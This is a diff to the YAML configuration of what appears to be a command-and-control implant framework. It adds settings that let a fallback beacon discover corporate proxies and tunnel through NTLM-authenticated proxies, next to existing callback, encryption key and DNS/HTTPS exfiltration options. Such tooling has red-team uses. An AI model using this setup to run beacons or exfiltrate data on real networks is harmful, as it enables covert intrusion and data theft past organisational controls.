@@ -104,6 +104,31 @@ c2:
   # If empty, derived from callback_url + dns_domain (deterministic).
   # Generate with: python3 -c "import os,base64; print(base64.b64encode(os.urandom(32)).decode())"
   encryption_key: ""
+
+  # ── Egress proxy (Python fallback beacon) ──
+  proxy:
+    # auto   = discover from env vars, registry, PAC/WPAD
+    # manual = always use the url below
+    # none   = force a direct connection
+    mode: "auto"
+    url: ""
+
+    # Corporate NTLM proxy authentication. Starts a loopback CONNECT relay that
+    # performs the NTLMv2 handshake, then tunnels the beacon through it. Needed
+    # when the proxy demands NTLM and the account lives in a different AD domain
+    # than the proxy, which urllib/WinINet cannot handle on their own.
+    ntlm:
+      enabled: false
+      # Upstream proxy. Leave host empty to reuse the auto-discovered proxy.
+      host: ""
+      port: 8080
+      # Domain can also be supplied inline as "CORP\\user" or "user@corp.local"
+      domain: ""
+      username: ""
+      password: ""
+      # Workstation name sent in the NTLM Type 3 message. Empty = local hostname.
+      workstation: ""
+
   # Exfiltration method: "dns" or "https"
   exfil_method: "https"
   exfil_chunk_size_bytes: 512
